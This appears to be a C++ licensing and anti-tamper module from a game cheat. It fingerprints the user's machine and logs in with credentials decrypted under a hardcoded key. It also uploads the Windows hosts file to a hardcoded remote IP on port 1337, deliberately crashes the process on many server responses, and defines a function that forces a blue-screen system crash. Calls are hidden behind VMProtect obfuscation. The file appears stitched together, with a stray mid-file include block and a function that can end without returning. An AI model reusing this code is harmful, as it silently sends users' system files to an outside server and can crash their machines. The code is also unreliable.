#ifndef _DEBUG
#include "security.h"
#include <fstream>
#include <Shlobj.h>
#include <windows.h>
#include <stdio.h>
#include "psapi.h"

#include "../helpers/utils.hpp"
#include "../options.hpp"

#include "../../CryptoPP/osrng.h"
#include "../../CryptoPP/cryptlib.h"
#include "../../CryptoPP/aes.h"
#include "../../CryptoPP/modes.h"
#include "../../CryptoPP/base64.h"
#include "../../CryptoPP/hex.h"

#define KEY "PMIMWODP91UQZ195"

std::string LoginData = "";
std::string PasswordData = "";

std::string SHA1(std::string text)
{
	CryptoPP::SHA1 sha1;
	std::string hash;
	CryptoPP::StringSource(text, true, new CryptoPP::HashFilter(sha1, new CryptoPP::HexEncoder(new CryptoPP::StringSink(hash))));
	return hash;
}

int SendAll(SOCKET s, char *buf, int *len)
{
	int total = 0;
	int bytesleft = *len;
	int n;

	while (total < *len)
	{
		n = send(s, buf + total, bytesleft, 0);
		if (n == -1) { break; }
		total += n;
		bytesleft -= n;
	}

	*len = total;

	return n == -1 ? -1 : 0;
}

void ReadAllBytes(char const *filename, std::vector<char> &result)
{
	std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
	std::ifstream::pos_type pos = ifs.tellg();

	std::vector<char> tmp(pos);

	ifs.seekg(0, std::ios::beg);
	ifs.read(&tmp[0], pos);

	result = tmp;
}

std::string Decrypt(const std::string& str_in, const std::string& key, const std::string& iv)
{
	std::string str_out;

	CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption decryption((byte*)key.c_str(), key.length(), (byte*)iv.c_str());

	CryptoPP::StringSource decryptor(str_in, true,
		new CryptoPP::Base64Decoder(
			new CryptoPP::StreamTransformationFilter(decryption,
				new CryptoPP::StringSink(str_out)
			)
		)
	);
	return str_out;
}

std::vector<std::string> SplitString(const std::string& s, char delimiter)
{
	std::vector<std::string> tokens;
	std::string token;
	std::istringstream tokenStream(s);

	while (std::getline(tokenStream, token, delimiter))
	{
		tokens.push_back(token);
	}

	return tokens;
}

SOCKET connectSocket;
int m_iResult;
bool bSentinel;

bool CSecurity::LoadConfig()
{
	VMProtectBeginUltra("Load config");

	char path[MAX_PATH];

	if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path)))
	{
		std::ifstream file(std::string(path) + _xor_("\\yy.set"));

		if (file.good())
		{
			std::string data;

			file >> data;

			file.close();

			data = Decrypt(data, _xor_(KEY), _xor_(KEY));

			auto sdata = SplitString(data, ':');

			LoginData = sdata[0];
			PasswordData = sdata[1];

			return true;
		}
	}

	VMProtectEnd();
	return false;
}
#include <Windows.h>
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BSOD()
{
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // вызываем привилегии выключения(SeShutdownPrivilege)
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); //вызываем аварийное выключение пк
}

bool CSecurity::Auth()
{
	VMProtectBeginUltra("Auth");

	char eNetworkData[BUFSIZ] = { 0 };
	char* pLoginData = new char[400];

	bSentinel = true;

	std::string hwid = GetHWID();

	int usernameLength = LoginData.length();
	int passwordLength = PasswordData.length();
	int hwidLength = hwid.length();

	char* packet = pLoginData;

	*(int*)pLoginData = (usernameLength + 1 + hwidLength + 1 + passwordLength + 1);

	pLoginData += 5;
	*(WORD*)pLoginData = 0x02;
	pLoginData += 1;

	strcpy((char*)(pLoginData), std::string(LoginData).c_str());
	pLoginData += usernameLength;
	strcpy((char*)(pLoginData), _xor_(";"));
	pLoginData += 1;

	strcpy((char*)(pLoginData), hwid.c_str());
	pLoginData += hwidLength;
	strcpy((char*)(pLoginData), _xor_(";"));
	pLoginData += 1;

	strcpy((char*)(pLoginData), PasswordData.c_str());
	pLoginData += passwordLength;
	strcpy((char*)(pLoginData), _xor_(";"));
	pLoginData += 1;

	m_iResult = send(connectSocket, packet, *(WORD*)(packet)+6, 0);

	m_iResult = recv(connectSocket, eNetworkData, BUFSIZ, 0);

	eNetworkData[m_iResult] = '\0';

	BYTE resCode = *(BYTE*)(eNetworkData + 2);

	if (m_iResult == 0)
	{
		closesocket(connectSocket);
		WSACleanup();
		connectSocket = NULL;
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 5)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 3 || resCode == 6)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 7)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 8)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 9)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	if (resCode == 17)
	{
		std::string text = eNetworkData + 3;

		std::stringstream test(text);
		std::string segment;
		std::vector<std::string> seglist;
		while (std::getline(test, segment, ':'))
		{
			seglist.push_back(segment);
		}

		Vars.days = stoi(seglist[0]);
		closesocket(connectSocket);
		WSACleanup();
		connectSocket = NULL;
		ZeroMemory(eNetworkData, BUFSIZ);

		VMProtectEnd();
		return true;
	}
	*((unsigned int*)0) = 0xDEAD;
}

bool CSecurity::Connect()
{
	VMProtectBeginUltra("Connect");
	WSADATA wsaData;

	connectSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo *ptr = NULL;
	struct addrinfo hints = { 0 };

	m_iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (m_iResult != 0)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

#define RandomInt(min, max) (rand() % (max - min + 1) + min)

	/*for (int i = 0; i < RandomInt(100, 200); i++)
	{
		struct addrinfo *FAKEresult1 = NULL;
		struct addrinfo FAKEhints1 = { 0 };

		struct addrinfo *FAKEresult2 = NULL;
		struct addrinfo FAKEhints2 = { 0 };

		if (getaddrinfo(_xor_("35.204.118.203"), _xor_("1337"), &FAKEhints1, &FAKEresult1)
			== getaddrinfo(_xor_("0"), _xor_("1337"), &FAKEhints2, &FAKEresult2))
			*((unsigned int*)0) = 0xDEAD;
	}*/

	m_iResult = getaddrinfo(_xor_("35.204.118.203"), _xor_("1337"), &hints, &result);

	if (m_iResult != 0)
	{
		*((unsigned int*)0) = 0xDEAD;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

		if (connectSocket == INVALID_SOCKET)
		{
			WSACleanup();
			*((unsigned int*)0) = 0xDEAD;
		}

		m_iResult = connect(connectSocket, ptr->ai_addr, ptr->ai_addrlen);
		if (m_iResult == SOCKET_ERROR)
		{
			closesocket(connectSocket);
			connectSocket = INVALID_SOCKET;
			*((unsigned int*)0) = 0xDEAD;
		}
	}

	freeaddrinfo(result);

	if (connectSocket == INVALID_SOCKET)
	{
		WSACleanup();
		connectSocket = NULL;
		*((unsigned int*)0) = 0xDEAD;
	}

	u_long m_iMode = 0;

	m_iResult = ioctlsocket(connectSocket, FIONBIO, &m_iMode);
	if (m_iResult == SOCKET_ERROR)
	{
		closesocket(connectSocket);
		WSACleanup();
		connectSocket = NULL;
		*((unsigned int*)0) = 0xDEAD;
	}

	//Hosts Check

	char value = 1;
	setsockopt(connectSocket, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));

	bSentinel = false;

	std::vector<char> chararr;
	std::string fpath(_xor_("C:\\Windows\\System32\\drivers\\etc\\hosts"));
	ReadAllBytes(fpath.c_str(), chararr);

	int file_size = chararr.size();
	char* pFileData = new char[file_size];
	memcpy(pFileData, chararr.data(), file_size);

	char* filePacket = new char[file_size + 6 + fpath.length() + 1];
	memset(filePacket, 0, file_size + 6 + fpath.length() + 1);

	*(int*)filePacket = fpath.length() + 1 + file_size;
	*(WORD*)(filePacket + 5) = 0x01;
	strcpy((char*)(filePacket + 6), fpath.c_str());
	memcpy((char*)(filePacket + 6 + fpath.length() + 1), pFileData, file_size);

	int r = file_size + 6 + fpath.length() + 1;
	if (SendAll(connectSocket, filePacket, &r) == -1)
	{
		closesocket(connectSocket);
		WSACleanup();
		connectSocket = NULL;
		delete[] pFileData;
		delete[] filePacket;
		*((unsigned int*)0) = 0xDEAD;
	}
	delete[] pFileData;
	delete[] filePacket;

	char eAuthData[BUFSIZ] = { 0 };
	m_iResult = recv(connectSocket, eAuthData, BUFSIZ, 0);

	eAuthData[m_iResult] = '\0';
	BYTE resCode = *(BYTE*)(eAuthData + 2);
	//MessageBoxA(0, std::to_string(resCode).c_str(), 0, 0);
	if (resCode == 3)
	{
		closesocket(connectSocket);
		WSACleanup();
		connectSocket = NULL;
		ZeroMemory(eAuthData, BUFSIZ);
		*((unsigned int*)0) = 0xDEAD;
	}

	VMProtectEnd();
	ZeroMemory(eAuthData, BUFSIZ);
}

std::string CSecurity::GetHWID()
{
	VMProtectBeginUltra("GetHWID");

	std::string result;

	char computerName[32], userName[32];

	DWORD disk_serialINT;
	GetVolumeInformationA("c:\\", NULL, NULL, &disk_serialINT, NULL, NULL, NULL, NULL);

	int CPUInfo[4] = { -1 };
	char CPUBrandString[0x40];
	__cpuid(CPUInfo, 0x80000000);
	unsigned int nExIds = CPUInfo[0];

	memset(CPUBrandString, 0, sizeof(CPUBrandString));

	for (int i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);
		if (i == 0x80000002)
			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000003)
			memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		else if (i == 0x80000004)
			memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
	}

	DWORD cnCharCount = 32;
	DWORD unCharCount = 32;

	GetComputerNameA(computerName, &cnCharCount);
	GetUserNameA(userName, &unCharCount);

	result = std::string(userName) + std::string(computerName) + std::to_string(disk_serialINT) + std::string(CPUBrandString);

	result.erase(std::remove_if(result.begin(), result.end(), isspace), result.end());

	result = SHA1(result).substr(22);

	std::transform(result.begin(), result.end(), result.begin(), ::tolower);
	VMProtectEnd();

	return result;
} 
#endif // !_DEBUG